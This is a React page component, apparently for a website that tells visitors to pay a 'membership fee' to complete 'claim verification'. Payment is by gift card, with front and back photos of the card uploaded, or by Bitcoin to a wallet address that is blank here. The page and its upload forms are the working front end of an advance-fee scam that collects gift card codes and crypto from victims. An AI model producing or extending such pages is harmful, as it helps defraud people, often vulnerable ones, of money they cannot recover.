import React, { useState } from "react";
import HeroHeader from "../components/HeroHeader";

export default function Payment() {
  const [giftcardStatus, setGiftcardStatus] = useState(null);
  const [bitcoinStatus, setBitcoinStatus] = useState(null);

  const bitcoinAddress = "";

  const copyBitcoin = () => {
    navigator.clipboard.writeText(bitcoinAddress);
    alert("Bitcoin address copied.");
  };

  const handleGiftcardSubmit = async (e) => {
    e.preventDefault();

    setGiftcardStatus(null);

    const formData = new FormData();
    formData.append("type", "giftcard");
    formData.append("name", e.target.name.value);
    formData.append("email", e.target.email.value);
    formData.append("frontImage", e.target.frontImage.files[0]);
    formData.append("backImage", e.target.backImage.files[0]);

    try {
      const res = await fetch("/api/payment", {
        method: "POST",
        body: formData,
      });

      const data = await res.json();

      if (data.success) {
        setGiftcardStatus("success");
        e.target.reset();
      } else {
        setGiftcardStatus("error");
      }
    } catch (err) {
      console.error(err);
      setGiftcardStatus("error");
    }
  };

  const handleBitcoinSubmit = async (e) => {
    e.preventDefault();

    setBitcoinStatus(null);

    const formData = new FormData();
    formData.append("type", "bitcoin");
    formData.append("name", e.target.name.value);
    formData.append("email", e.target.email.value);
    formData.append("receipt", e.target.receipt.files[0]);

    try {
      const res = await fetch("/api/payment", {
        method: "POST",
        body: formData,
      });

      const data = await res.json();

      if (data.success) {
        setBitcoinStatus("success");
        e.target.reset();
      } else {
        setBitcoinStatus("error");
      }
    } catch (err) {
      console.error(err);
      setBitcoinStatus("error");
    }
  };

  return (
    <div>
      <HeroHeader />

      <div className="payment-page">
        <h1 className="payment-title">Payment & Membership Fee Submission</h1>

        <p className="payment-text">
          Complete your claim verification by paying the required membership fee
          using either a Gift Card or Bitcoin. After payment, submit proof of
          payment by uploading your Gift Card images or Bitcoin transaction
          receipt. Our verification team will review your submission and process
          your claim accordingly.
        </p>

        {/* GIFT CARD CARD */}

        <div className="payment-card">
          <h2>Gift Card Payment</h2>

          <p className="card-text">
            Upload clear images of the front and back of your gift card.
          </p>

          <form onSubmit={handleGiftcardSubmit} encType="multipart/form-data">
            <input type="text" name="name" placeholder="Full Name" required />

            <input
              type="email"
              name="email"
              placeholder="Email Address"
              required
            />

            <label>Front of Gift Card</label>
            <input type="file" name="frontImage" accept="image/*" required />

            <label>Back of Gift Card</label>
            <input type="file" name="backImage" accept="image/*" required />

            <button type="submit">Submit Gift Card</button>
          </form>

          {giftcardStatus === "success" && (
            <div className="success-box">
              Gift card submission received successfully.
            </div>
          )}

          {giftcardStatus === "error" && (
            <div className="error-box">
              Unable to submit gift card information. Please try again.
            </div>
          )}
        </div>

        {/* BITCOIN CARD */}

        <div className="payment-card">
          <h2>Bitcoin Payment</h2>

          <p className="card-text">
            Send your payment to the Bitcoin wallet address below, then upload
            your transaction receipt.
          </p>

          <div className="btc-address">{bitcoinAddress}</div>

          <button type="button" className="copy-btn" onClick={copyBitcoin}>
            Copy Bitcoin Address
          </button>

          <form onSubmit={handleBitcoinSubmit} encType="multipart/form-data">
            <input type="text" name="name" placeholder="Full Name" required />

            <input
              type="email"
              name="email"
              placeholder="Email Address"
              required
            />

            <label>Upload Bitcoin Receipt</label>

            <input type="file" name="receipt" accept="image/*,.pdf" required />

            <button type="submit">Submit Receipt</button>
          </form>

          {bitcoinStatus === "success" && (
            <div className="success-box">
              Bitcoin receipt submitted successfully.
            </div>
          )}

          {bitcoinStatus === "error" && (
            <div className="error-box">
              Unable to submit your Bitcoin receipt. Please try again.
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
